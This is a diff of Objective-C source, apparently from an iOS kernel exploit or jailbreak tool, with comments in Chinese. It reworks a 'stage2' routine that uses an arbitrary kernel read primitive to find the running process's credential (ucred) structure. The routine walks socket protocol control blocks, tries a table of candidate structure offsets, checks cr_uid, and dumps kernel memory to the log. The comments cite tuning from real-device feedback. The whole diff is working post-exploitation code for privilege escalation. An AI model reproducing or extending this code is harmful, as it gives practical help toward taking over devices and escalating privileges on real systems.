@@ -286,60 +286,33 @@ static uint64_t ds3105_scan_pcb_for_socket(uint64_t pcb)
     return 0;
 }
 
-/// 定位本进程 cred：两个 socket 的 so_cred 指向同一对象 + cr_uid 校验
-/// （历史 4/4 命中 socket+0x208；这里用有界扫描 0x1f0~0x230，不写死偏移）
-///
-/// 0.6.0 真机反馈：stage2 在「取 socket 对象」这一跳失败（escape(-1) socket object address invalid）。
-/// 因此这里把每一步原始值都打出来，并加两个**有界**兜底：
-///   ① off_inpcb_inp_socket 为 0 → 回退常量 0x40（两个后端在 17.x–18.x 都是这个值）
-///   ② 读出的指针没通过校验 → 先试 XPACI 规范化，再试"只在 pcb 结构内"的有界扫描
-static uint64_t ds3105_find_cred(NSString **why)
+/// 诊断用：把一段内核内存按 8 字节写进日志（地址已过闸门，读的是已知对象内部）
+static void ds3105_dump(const char *tag, uint64_t addr, uint64_t len)
 {
-    uint64_t rwPcb  = t3105_rwSocketPcb;
-    uint64_t ctlPcb = t3105_controlSocketPcb;
-    uint32_t off    = t3105_off_inpcb_inp_socket;
-
-    NSLog(@"[3105] stage2 diag: rwSocketPcb=0x%llx controlSocketPcb=0x%llx off_inpcb_inp_socket=0x%x off_socket_so_usecount=0x%x",
-          (unsigned long long)rwPcb, (unsigned long long)ctlPcb, off, t3105_off_socket_so_usecount);
-
-    if (!ds3105_is_kaddr(rwPcb) || !ds3105_is_kaddr(ctlPcb)) {
-        if (why) *why = [NSString stringWithFormat:
-                         @"socket pcb invalid（rw=0x%llx ctl=0x%llx；3105 的 pcb 全局量没被赋值?）",
-                         (unsigned long long)rwPcb, (unsigned long long)ctlPcb];
-        return 0;
+    if (!ds3105_is_kaddr(addr)) {
+        NSLog(@"[3105] dump %s: 地址非法 0x%llx", tag, (unsigned long long)addr);
+        return;
     }
-    if (off == 0) {
-        off = 0x40;
-        NSLog(@"[3105] stage2 diag: off_inpcb_inp_socket 为 0 → 回退常量 0x40");
+    NSMutableString *s = [NSMutableString string];
+    for (uint64_t o = 0; o < len; o += 8) {
+        [s appendFormat:@"+%02llx=%016llx ", (unsigned long long)o,
+         (unsigned long long)t3105_kread64(addr + o)];
     }
+    NSLog(@"[3105] dump %s @0x%llx: %@", tag, (unsigned long long)addr, s);
+}
 
-    uint64_t s0raw = t3105_kread64(rwPcb  + off);
-    uint64_t s1raw = t3105_kread64(ctlPcb + off);
-    uint64_t s0 = ds3105_is_kaddr(s0raw) ? s0raw : ds3105_S(s0raw);
-    uint64_t s1 = ds3105_is_kaddr(s1raw) ? s1raw : ds3105_S(s1raw);
-    NSLog(@"[3105] stage2 diag: socket 原始值 rw=0x%llx→0x%llx ctl=0x%llx→0x%llx（off=0x%x）",
-          (unsigned long long)s0raw, (unsigned long long)s0,
-          (unsigned long long)s1raw, (unsigned long long)s1, off);
+/// inpcb → socket 的候选偏移。不同系统版本/后端可能不同，所以逐个试，
+/// 由后面的「两 socket so_cred 一致 + cr_uid 校验」自动挑出正确的那组（不靠猜）。
+static const uint32_t kDs3105SocketOffsets[] = {
+    0x40, 0x38, 0x48, 0x50, 0x30, 0x58, 0x28, 0x60, 0x68, 0x70, 0x20, 0x78
+};
 
-    if (!ds3105_is_kaddr(s0) || !ds3105_is_kaddr(s1)) {
-        uint64_t a = ds3105_scan_pcb_for_socket(rwPcb);
-        uint64_t b = ds3105_scan_pcb_for_socket(ctlPcb);
-        if (a && b) {
-            s0 = a; s1 = b;
-            NSLog(@"[3105] stage2 diag: 改用有界扫描结果 rw=0x%llx ctl=0x%llx",
-                  (unsigned long long)s0, (unsigned long long)s1);
-        } else {
-            if (why) *why = [NSString stringWithFormat:
-                             @"socket object address invalid（rw raw=0x%llx→0x%llx, ctl raw=0x%llx→0x%llx, off=0x%x, 扫描 rw=0x%llx ctl=0x%llx）",
-                             (unsigned long long)s0raw, (unsigned long long)s0,
-                             (unsigned long long)s1raw, (unsigned long long)s1,
-                             off, (unsigned long long)a, (unsigned long long)b];
-            return 0;
-        }
-    }
-
-    uid_t me = getuid();
-    for (uint64_t so = 0x1f0; so <= 0x230; so += 8) {
+/// 在一对 socket 对象里找共享的 so_cred（窗口 0x1e0~0x260），并用 cr_uid 复核。
+/// 这是**强校验**：两个独立 socket 的同偏移值必须相同，且该 ucred 的 cr_uid 必须等于本进程 uid。
+static uint64_t ds3105_cred_from_sockets(uint64_t s0, uint64_t s1, uid_t me, uint64_t *hitOff)
+{
+    if (!ds3105_is_zone(s0) || !ds3105_is_zone(s1)) return 0;
+    for (uint64_t so = 0x1e0; so <= 0x260; so += 8) {
         uint64_t a = t3105_kread64(s0 + so);
         if (!a) continue;
         uint64_t b = t3105_kread64(s1 + so);
@@ -348,13 +321,116 @@ static uint64_t ds3105_find_cred(NSString **why)
         if (!ds3105_is_kaddr(cand) || (cand & 0xF) != 0) continue;
         // posix_cred 在 ucred+0x18，cr_uid 在它开头
         if (t3105_kread32(cand + 0x18) != (uint32_t)me) continue;
-        NSLog(@"[3105] stage2 diag: cred 命中 socket+0x%llx → 0x%llx（uid=%u）",
-              (unsigned long long)so, (unsigned long long)cand, (unsigned)me);
+        if (hitOff) *hitOff = so;
         return cand;
     }
-    if (why) *why = [NSString stringWithFormat:
-                     @"no shared so_cred passing cr_uid check（rw=0x%llx ctl=0x%llx）",
-                     (unsigned long long)s0, (unsigned long long)s1];
+    return 0;
+}
+
+/// 从一个 pcb 结构里收集前 N 个"像 socket 对象"的候选指针（只在 0x0~0x400 内，有界）
+static int ds3105_collect_socket_candidates(uint64_t pcb, uint64_t out[4])
+{
+    int n = 0;
+    for (uint64_t o = 0; o <= 0x400 && n < 4; o += 8) {
+        uint64_t cand = t3105_kread64(pcb + o);
+        if (!ds3105_is_zone(cand)) continue;
+        if ((cand & 0xF) != 0) continue;
+        out[n++] = cand;
+    }
+    return n;
+}
+
+/// 定位本进程 cred：两个 socket 的 so_cred 指向同一对象 + cr_uid 校验。
+///
+/// 0.6.1 真机反馈：pcb 全局量是合法内核地址 ✓、3105 读原语也正常（它自己读内核基址拿到完整 64 位 ✓），
+/// 但 `pcb + off_inpcb_inp_socket(0x40)` 读出来是 `0x10ab3850`（不是内核指针）→ **这一跳的偏移不对**。
+/// 所以这里改成**自定位**：候选偏移逐个试，用强校验（两 socket 共享 so_cred + cr_uid）选出正确的那组；
+/// 再把 pcb 前 0x80 字节打进日志，万一全失败，下次看日志就能直接定位。
+static uint64_t ds3105_find_cred(NSString **why)
+{
+    uint64_t rwPcb  = t3105_rwSocketPcb;
+    uint64_t ctlPcb = t3105_controlSocketPcb;
+    uid_t me = getuid();
+
+    NSLog(@"[3105] stage2 diag: rwSocketPcb=0x%llx controlSocketPcb=0x%llx off_inpcb_inp_socket=0x%x so_usecount=0x%x uid=%u",
+          (unsigned long long)rwPcb, (unsigned long long)ctlPcb,
+          t3105_off_inpcb_inp_socket, t3105_off_socket_so_usecount, (unsigned)me);
+
+    if (!ds3105_is_kaddr(rwPcb) || !ds3105_is_kaddr(ctlPcb)) {
+        if (why) *why = [NSString stringWithFormat:
+                         @"socket pcb invalid（rw=0x%llx ctl=0x%llx；3105 的 pcb 全局量没被赋值?）",
+                         (unsigned long long)rwPcb, (unsigned long long)ctlPcb];
+        return 0;
+    }
+
+    ds3105_dump("rwPcb", rwPcb, 0x80);
+    ds3105_dump("ctlPcb", ctlPcb, 0x80);
+
+    NSMutableArray<NSString *> *tried = [NSMutableArray array];
+
+    // ① 候选偏移：先试 offsets 表里的值（为 0 时用 0x40），再试常见候选
+    uint32_t tableOff = t3105_off_inpcb_inp_socket ? t3105_off_inpcb_inp_socket : 0x40;
+    NSMutableArray<NSNumber *> *offs = [NSMutableArray arrayWithObject:@(tableOff)];
+    for (size_t i = 0; i < sizeof(kDs3105SocketOffsets) / sizeof(kDs3105SocketOffsets[0]); i++) {
+        if (kDs3105SocketOffsets[i] != tableOff) [offs addObject:@(kDs3105SocketOffsets[i])];
+    }
+
+    for (NSNumber *n in offs) {
+        uint32_t off = n.unsignedIntValue;
+        uint64_t s0raw = t3105_kread64(rwPcb  + off);
+        uint64_t s1raw = t3105_kread64(ctlPcb + off);
+        uint64_t s0 = ds3105_is_kaddr(s0raw) ? s0raw : ds3105_S(s0raw);
+        uint64_t s1 = ds3105_is_kaddr(s1raw) ? s1raw : ds3105_S(s1raw);
+
+        if (!ds3105_is_zone(s0) || !ds3105_is_zone(s1)) {
+            [tried addObject:[NSString stringWithFormat:@"off=0x%x(非 zone: 0x%llx/0x%llx)", off,
+                              (unsigned long long)s0raw, (unsigned long long)s1raw]];
+            continue;
+        }
+
+        uint64_t hit = 0;
+        uint64_t cred = ds3105_cred_from_sockets(s0, s1, me, &hit);
+        if (cred) {
+            NSLog(@"[3105] stage2 diag: 命中 inpcb→socket 偏移 0x%x（socket 0x%llx/0x%llx，so_cred 偏移 0x%llx）",
+                  off, (unsigned long long)s0, (unsigned long long)s1, (unsigned long long)hit);
+            return cred;
+        }
+        [tried addObject:[NSString stringWithFormat:@"off=0x%x(socket 0x%llx/0x%llx 无共享 cred)", off,
+                          (unsigned long long)s0, (unsigned long long)s1]];
+    }
+
+    // ② 也许 pcb 全局量本身就是 socket 对象
+    {
+        uint64_t hit = 0;
+        uint64_t cred = ds3105_cred_from_sockets(rwPcb, ctlPcb, me, &hit);
+        if (cred) {
+            NSLog(@"[3105] stage2 diag: pcb 全局量本身就是 socket 对象（so_cred 偏移 0x%llx）",
+                  (unsigned long long)hit);
+            return cred;
+        }
+    }
+
+    // ③ 有界扫描：在 pcb 结构内收集候选 socket，两两组合后用强校验挑
+    {
+        uint64_t candA[4] = {0}, candB[4] = {0};
+        int na = ds3105_collect_socket_candidates(rwPcb, candA);
+        int nb = ds3105_collect_socket_candidates(ctlPcb, candB);
+        for (int i = 0; i < na; i++) {
+            for (int j = 0; j < nb; j++) {
+                uint64_t hit = 0;
+                uint64_t cred = ds3105_cred_from_sockets(candA[i], candB[j], me, &hit);
+                if (cred) {
+                    NSLog(@"[3105] stage2 diag: 有界候选命中（rw=0x%llx ctl=0x%llx，so_cred 偏移 0x%llx）",
+                          (unsigned long long)candA[i], (unsigned long long)candB[j], (unsigned long long)hit);
+                    return cred;
+                }
+            }
+        }
+        [tried addObject:[NSString stringWithFormat:@"有界扫描候选 rw=%d ctl=%d 个，均无共享 cred", na, nb]];
+    }
+
+    if (why) *why = [NSString stringWithFormat:@"no shared so_cred passing cr_uid check；已试：%@",
+                     [tried componentsJoinedByString:@" | "]];
     return 0;
 }
 
